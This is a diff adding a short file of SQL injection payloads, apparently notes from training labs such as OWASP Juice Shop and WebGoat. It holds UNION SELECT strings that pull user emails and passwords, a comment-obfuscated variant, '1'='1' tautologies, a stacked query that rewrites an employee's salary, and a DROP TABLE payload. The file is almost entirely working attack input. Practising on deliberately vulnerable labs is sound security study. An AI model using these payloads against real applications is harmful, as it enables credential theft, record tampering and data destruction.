@@ -1,0 +1,15 @@
+'))UNION SELECT * FROM Users--
+
+'))UNION/**/SELECT/**/id,/**/email,/**/password,/**/'4',/**/'5',/**/'6',/**/'7',/**/'7',/**/9/**/FROM/**/users--
+
+admin@juice-sh.op
+
+GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
+
+SELECT * FROM employees WHERE userid='96134'
+UPDAT EMPLOYEES SET department='Sales' where userid='89762'
+ALTER TABLE employees ADD phone varchar(20);
+GRANT ALTER TABLE TO UnauthorizedUser
+Smith' or '1'='1
+3SL99A' OR '1'='1'; UPDATE EMPLOYEES SET salary='85000' where userid='37648
+%'; DROP TABLE access_log;--
